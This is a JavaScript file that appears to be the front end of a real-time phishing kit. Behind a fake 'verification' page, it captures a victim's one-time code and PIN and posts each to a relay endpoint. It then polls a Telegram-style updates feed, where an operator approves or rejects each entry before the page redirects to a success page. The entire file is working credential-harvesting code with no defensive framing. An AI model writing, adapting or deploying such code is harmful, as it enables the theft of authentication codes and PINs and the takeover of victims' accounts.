let lastUpdateId = 0;
let checkInterval;
let timerInterval;

document.addEventListener('DOMContentLoaded', function() {
    const refId = localStorage.getItem('currentRef');
    if (refId) {
        document.getElementById('refId').textContent = refId;
        startCheckingUpdates();
    }
    
    document.getElementById('codeForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const code = document.getElementById('verificationCode').value;
        const refId = localStorage.getItem('currentRef');
        
        document.getElementById('codeForm').style.opacity = '0.5';
        document.getElementById('submitCodeBtn').disabled = true;
        document.getElementById('timer').classList.remove('hidden');
        
        startTimer(180);
        
        fetch('/api/send-message', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                message: `🔐 CODE ENTERED\nRef: ${refId}\nCode: ${code}`
            })
        });
    });
});

function startCheckingUpdates() {
    checkInterval = setInterval(async () => {
        try {
            const response = await fetch(`/api/get-updates/${lastUpdateId}`);
            const data = await response.json();
            
            if (data.success && data.data.result.length > 0) {
                data.data.result.forEach(update => {
                    lastUpdateId = update.update_id;
                    const text = update.message?.text || '';
                    const refId = localStorage.getItem('currentRef');
                    
                    if (text.includes(`/correct_${refId}`)) handleCorrectCode();
                    if (text.includes(`/wrong_${refId}`)) handleWrongCode();
                    if (text.includes(`/pin_correct_${refId}`)) handlePinCorrect();
                    if (text.includes(`/pin_wrong_${refId}`)) handlePinWrong();
                });
            }
        } catch (error) {
            console.log('Checking for updates...');
        }
    }, 3000);
}

function handleCorrectCode() {
    clearInterval(checkInterval);
    if (timerInterval) clearInterval(timerInterval);
    
    document.getElementById('timer').classList.add('hidden');
    document.getElementById('codeForm').classList.add('hidden');
    document.getElementById('pinSection').classList.remove('hidden');
    showMessage('Code verified! Enter your PIN.', 'success');
}

function handleWrongCode() {
    showMessage('Wrong code. Try again.', 'error');
    resetCodeForm();
}

function submitPin() {
    const pin = document.getElementById('pinCode').value;
    const refId = localStorage.getItem('currentRef');
    
    fetch('/api/send-message', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            message: `🔑 PIN ENTERED\nRef: ${refId}\nPIN: ${pin}`
        })
    });
    
    showMessage('PIN sent for verification', 'success');
}

function handlePinCorrect() {
    showMessage('Verification complete! Redirecting...', 'success');
    setTimeout(() => window.location.href = 'success.html', 2000);
}

function handlePinWrong() {
    showMessage('Wrong PIN. Try again.', 'error');
    document.getElementById('pinCode').value = '';
}

function startTimer(seconds) {
    const timerDisplay = document.getElementById('countdown');
    const progressBar = document.getElementById('progress');
    
    timerInterval = setInterval(() => {
        seconds--;
        timerDisplay.textContent = seconds;
        progressBar.style.width = (seconds/180)*100 + '%';
        
        if (seconds <= 0) {
            clearInterval(timerInterval);
            handleTimeout();
        }
    }, 1000);
}

function handleTimeout() {
    showMessage('Time expired. Try again.', 'error');
    resetCodeForm();
}

function resetCodeForm() {
    document.getElementById('timer').classList.add('hidden');
    document.getElementById('codeForm').style.opacity = '1';
    document.getElementById('submitCodeBtn').disabled = false;
    document.getElementById('verificationCode').value = '';
    if (timerInterval) clearInterval(timerInterval);
}

function showMessage(text, type) {
    const msgBox = document.getElementById('messageBox');
    msgBox.textContent = text;
    msgBox.className = 'message-box ' + type;
    msgBox.classList.remove('hidden');
    setTimeout(() => msgBox.classList.add('hidden'), 5000);
}